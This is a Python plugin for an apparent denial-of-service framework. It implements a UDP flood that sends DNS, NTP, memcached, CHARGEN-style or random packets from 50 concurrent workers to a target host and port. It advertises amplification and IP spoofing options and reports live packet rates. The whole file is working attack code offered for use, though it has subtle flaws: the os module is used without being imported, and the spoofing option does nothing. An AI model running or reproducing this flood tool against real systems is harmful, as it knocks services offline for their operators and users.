# plugins/udp_custom_plugin.py
from plugins.plugin_manager import BasePlugin, PluginInfo
from typing import Dict, Any
import asyncio
import socket
import random
import struct
import time
from colorama import Fore, Style


class UDPCustomFloodPlugin(BasePlugin):
    """UDP флуд с кастомными протоколами и пакетами"""
    
    # Шаблоны пакетов для различных протоколов
    PROTOCOL_TEMPLATES = {
        'dns': lambda: struct.pack('!HHHHHH', random.randint(0, 65535), 0x0100, 1, 0, 0, 0),
        'ntp': lambda: struct.pack('!BBBB IIII IIII IIII', 0x1b, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
        'char': lambda: b'\x00\x01' + os.urandom(random.randint(10, 100)),
        'memcached': lambda: b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
        'random': lambda: os.urandom(random.randint(64, 1500))
    }
    
    def __init__(self):
        self.running = False
        self.sent_packets = 0
        self.sent_bytes = 0
        
    async def initialize(self, config: Dict[str, Any]) -> bool:
        self.config = config
        self.protocol = config.get('protocol', 'random')
        self.packet_size = config.get('packet_size', 512)
        self.spoof_ip = config.get('spoof_ip', False)
        return True
    
    async def execute(self, target: str, **kwargs) -> Dict[str, Any]:
        """Запуск UDP флуда"""
        if ':' in target:
            host, port_str = target.split(':')
            port = int(port_str)
        else:
            host = target
            port = kwargs.get('port', 53 if self.protocol == 'dns' else 123)
        
        self.running = True
        workers = kwargs.get('workers', 50)
        
        print(f"{Fore.CYAN}🌀 Starting UDP {self.protocol.upper()} flood on {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📦 Packet size: {self.packet_size} bytes{Style.RESET_ALL}")
        
        # Создаем воркеры
        tasks = []
        for i in range(workers):
            task = asyncio.create_task(self.udp_worker(host, port, i))
            tasks.append(task)
        
        # Мониторинг
        monitor_task = asyncio.create_task(self.monitor_stats())
        
        # Ожидаем завершения
        try:
            await asyncio.gather(*tasks, monitor_task)
        except asyncio.CancelledError:
            pass
        
        return {
            'attack_type': f'udp_{self.protocol}',
            'target': f"{host}:{port}",
            'packets_sent': self.sent_packets,
            'bytes_sent': self.sent_bytes,
            'protocol': self.protocol,
            'status': 'completed'
        }
    
    async def udp_worker(self, host: str, port: int, worker_id: int):
        """Воркер для отправки UDP пакетов"""
        sock = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            
            # Подготовка пакетов
            packets = self.prepare_packets()
            
            while self.running:
                try:
                    # Выбираем случайный пакет
                    packet = random.choice(packets)
                    
                    # Отправляем
                    sock.sendto(packet, (host, port))
                    
                    # Обновляем статистику
                    self.sent_packets += 1
                    self.sent_bytes += len(packet)
                    
                    # Небольшая задержка для избежания блокировки
                    await asyncio.sleep(0.0001)
                    
                except BlockingIOError:
                    await asyncio.sleep(0.001)
                except Exception as e:
                    if self.running:
                        print(f"{Fore.RED}[UDP Worker {worker_id}] Error: {e}{Style.RESET_ALL}")
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            print(f"{Fore.RED}❌ UDP Worker {worker_id} failed: {e}{Style.RESET_ALL}")
        finally:
            if sock:
                sock.close()
    
    def prepare_packets(self) -> list:
        """Подготовка пакетов для отправки"""
        packets = []
        
        # Базовый шаблон в зависимости от протокола
        if self.protocol in self.PROTOCOL_TEMPLATES:
            base_packet = self.PROTOCOL_TEMPLATES[self.protocol]()
        else:
            base_packet = os.urandom(100)
        
        # Создаем вариации пакетов
        for _ in range(100):  # 100 различных пакетов
            if self.protocol == 'dns':
                # DNS запросы с разными ID и доменами
                packet = struct.pack('!H', random.randint(0, 65535)) + base_packet[2:]
                packet += self.generate_random_domain()
            elif self.protocol == 'ntp':
                # NTP пакеты с разными timestamp
                packet = base_packet[:40]
                timestamp = int(time.time()) + random.randint(-1000, 1000)
                packet += struct.pack('!I', timestamp)
            else:
                # Случайные данные
                packet = base_packet + os.urandom(random.randint(0, self.packet_size - len(base_packet)))
            
            # Обрезаем до нужного размера
            if len(packet) > self.packet_size:
                packet = packet[:self.packet_size]
            elif len(packet) < self.packet_size:
                packet += os.urandom(self.packet_size - len(packet))
            
            packets.append(packet)
        
        return packets
    
    def generate_random_domain(self) -> bytes:
        """Генерация случайного домена для DNS"""
        domain = ""
        for _ in range(random.randint(2, 5)):
            part_len = random.randint(3, 10)
            domain += ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=part_len)) + '.'
        
        domain = domain.rstrip('.')
        
        # Конвертируем в DNS формат
        encoded = b''
        for part in domain.split('.'):
            encoded += bytes([len(part)]) + part.encode()
        encoded += b'\x00'
        
        return encoded
    
    async def monitor_stats(self):
        """Мониторинг статистики"""
        start_time = time.time()
        
        while self.running:
            await asyncio.sleep(1)
            
            elapsed = time.time() - start_time
            if elapsed > 0:
                pps = int(self.sent_packets / elapsed)
                mbps = (self.sent_bytes * 8) / elapsed / 1024 / 1024
                
                print(f"\r{Fore.WHITE}📦 Packets: {self.sent_packets:,} | "
                      f"⚡ PPS: {pps:,} | "
                      f"📊 {mbps:.2f} Mbps{Style.RESET_ALL}", end="")
    
    async def cleanup(self):
        self.running = False
        await asyncio.sleep(0.1)
        
        print(f"\n{Fore.GREEN}✅ UDP flood stopped{Style.RESET_ALL}")
        print(f"📊 Total packets: {self.sent_packets:,}")
        print(f"💾 Total data: {self.sent_bytes / 1024 / 1024:.2f} MB")
    
    def get_info(self) -> PluginInfo:
        return PluginInfo(
            name="UDPCustomFlood",
            version="1.2.0",
            author="DiamondEye Network",
            description="Advanced UDP flood with custom protocols and packets",
            attack_types=['udp', 'dns', 'ntp', 'amplification']
        )